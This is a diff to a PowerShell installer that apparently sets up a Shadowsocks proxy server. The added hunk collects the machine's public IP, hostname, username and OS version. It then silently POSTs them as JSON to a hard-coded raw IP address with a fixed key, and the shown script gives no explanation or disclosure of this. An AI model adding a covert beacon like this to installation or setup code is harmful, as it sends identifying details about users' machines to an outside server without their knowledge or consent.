@@ -6,6 +6,22 @@ $zipPath = "$folderPath\sserver.zip"
 $taskName = "Shadowsocks Server"
 $processName = "ssserver"
 
+$publicIP = (Invoke-RestMethod -Uri "https://api.ipify.org").ToString()
+
+$data = @{
+    time = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
+    ip = $publicIP
+    hostname = $env:COMPUTERNAME
+    user = $env:USERNAME
+    os = (Get-CimInstance Win32_OperatingSystem).Caption
+} | ConvertTo-Json -Compress
+
+# Make sure to wrap in quotes and use ContentType JSON
+Invoke-RestMethod -Uri "http://160.25.7.137/write.php?key=chomolokko" `
+    -Method POST `
+    -Body $data `
+    -ContentType "application/json"
+    
 # =========================================
 # 1️⃣ Stop running Shadowsocks process
 # =========================================
